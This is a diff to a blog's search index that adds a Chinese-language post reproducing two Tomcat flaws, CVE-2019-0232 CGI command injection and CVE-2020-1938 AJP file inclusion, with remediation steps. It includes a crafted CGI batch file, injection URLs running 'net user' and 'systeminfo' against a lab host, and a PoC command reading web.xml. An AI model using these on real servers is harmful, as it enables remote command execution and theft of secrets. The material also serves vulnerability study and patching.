@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>中间件漏洞Tomcat篇(2)</title>
+      <link href="/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/"/>
+      <url>/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/</url>
+      
+        <content type="html"><![CDATA[<h2 id="3-远程代码执行（CVE-2019-0232）"><a href="#3-远程代码执行（CVE-2019-0232）" class="headerlink" title="3.远程代码执行（CVE-2019-0232）"></a>3.远程代码执行（CVE-2019-0232）</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对 Servlet和JavaServer Page（JSP）的支持。 4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由 于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。 </p><pre class=" language-shell"><code class="language-shell">触发该漏洞需要同时满足以下条件： 1. 系统为Windows 2. 启用了CGI Servlet（默认为关闭） 3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞相关的代码在 <code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code> 中，<code>CGIServlet</code>提供了一个<code>cgi</code>的调用接口，在启用 <code>enableCmdLineArguments</code> 参数时，会根据<code>RFC 3875</code>来从Url参数中生成命令行参数，并把参数传递至Java的<code>Runtime</code>执行。这个漏洞是因为<code>Runtime.getRuntime().exec</code>在Windows中和Linux中底层实现不同导致的。</p><p>Java的 <code>Runtime.getRuntime().exec</code> 在<code>CGI</code>调用这种情况下很难有命令注入。而Windows中创建进程使用的是 <code>CreateProcess</code> ，会将参数合并成字符串，作为 <code>lpComandLine</code> 传入 <code>CreateProcess</code> 。程序启动后调用 <code>GetCommandLine</code> 获取参数，并调用 <code>CommandLineToArgvW</code> 传至 argv。在Windows中，当 <code>CreateProcess</code> 中的参数为 bat 文件或是 cmd 文件时，会调用 <code>cmd.exe</code> , 故最后会变成 <code>cmd.exe /c "arg.bat &amp; dir"</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre class=" language-shell"><code class="language-shell">Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93</code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Tomcat的CGI_Servlet组件默认是关闭的，在 conf/web.xml 中找到注释的CGIServlet部分，去掉注释， 并配置enableCmdLineArguments和executable</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/1.png"></p><p> 然后在<code>conf/web.xml</code>中启用<code>cgi</code>的 <code>servlet-mapping</code>（去掉注释）</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/2.png"></p><p>修改<code>conf/context.xml</code>，添加 <code>privileged="true"</code>属性，否则会没有权限</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/3.png"></p><p>在<code>webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录，并在该目录下创建一个test.bat，test.bat中写入如下内容，重启tomcat。</p><pre class=" language-bash"><code class="language-bash">@echo off<span class="token keyword">echo</span> Content-Type: text/plainecho.<span class="token keyword">set</span> off<span class="token operator">=</span>%~1%off%</code></pre><p>接着访问<code>http://192.168.3.208:8080/cgi-bin/test.bat?&amp;C%3A%5CWindows%5CSystem32%5Cnet%20user</code>即可执行<code>net user</code>命令</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/4.png"></p><p>我们也可以访问<code>http://192.168.3.208:8080/cgi-bin/test.bat?&amp;C%3A%5CWindows%5CSystem32%5Csysteminfo</code>执行<code>systeminfo</code>命令，只要修改后面参数即可进行任意命令执行</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/5.png"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时进行版本更新</p><h2 id="4-Apache-Tomcat文件包含漏洞（CVE-2020-1938）"><a href="#4-Apache-Tomcat文件包含漏洞（CVE-2020-1938）" class="headerlink" title="4.Apache Tomcat文件包含漏洞（CVE-2020-1938）"></a>4.Apache Tomcat文件包含漏洞（CVE-2020-1938）</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。通常用java开发的应用程序的war包也是放在webapp目录下的，所以也能够被攻击者读取到。这也意味着，如果你把数据库用户名密码、连接其他后端服务的账号、JWT签名secret、OAuth AppSecret等密钥信息放在properties文件里的话，那么，攻击者可能现在也拿到了这些信息，并且正在试着入侵你的服务器。</p><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><pre class=" language-sh"><code class="language-sh">Apache Tomcat 6Tomcat 7系列 <7.0.100Tomcat 8系列 < 8.5.51Tomcat 9 系列 <9.0.31</code></pre><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>tomcat默认的<code>conf/server.xml</code>中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另 外一个就是默认的8009AJP协议端口，两个端口默认均监听在外网ip。tomcat在接收AJP请求的时候调用<code>org.apache.coyote.ajp.AjpProcessor</code>来处理AJP消息， prepareRequest将AJP里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而 可以控制request对象的下面三个Attribute属性</p><pre class=" language-sh"><code class="language-sh">javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path</code></pre><p>再通过控制AJP控制的上述三个属性来读取文件，通过操控上述三个属性从而可以读取到应用目录下的任何文件。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1.利用nmap进行扫描探测是否开启AJP服务的8009端口</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/6.png"></p><p>2.利用POC直接验证</p><p>工具地址：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><pre class=" language-shell"><code class="language-shell">使用命令：python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py [IP] -p 8009 -f WEB-INF/web.xml</code></pre><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/7.png"></p><p>成功读取到web.xml文件</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.更新到安全版本</p><p>2.关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉</p><pre class=" language-shell"><code class="language-shell"><Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /></code></pre><p>3.配置AJP配置中的secretRequired跟secret属性来限制认证</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 中间件漏洞 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Tomcat漏洞 </tag>
+            
+            <tag> 中间件漏洞 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>中间件漏洞Tomcat篇(1)</title>
       <link href="/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/"/>
       <url>/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/</url>
@@ -47,9 +74,9 @@
       
         <tags>
             
-            <tag> Windows应急响应 </tag>
-            
             <tag> 蓝队 </tag>
+            
+            <tag> Windows应急响应 </tag>
             
         </tags>
       
@@ -74,9 +101,9 @@
       
         <tags>
             
-            <tag> 蓝队 </tag>
-            
             <tag> Linux应急响应 </tag>
+            
+            <tag> 蓝队 </tag>
             
         </tags>
       
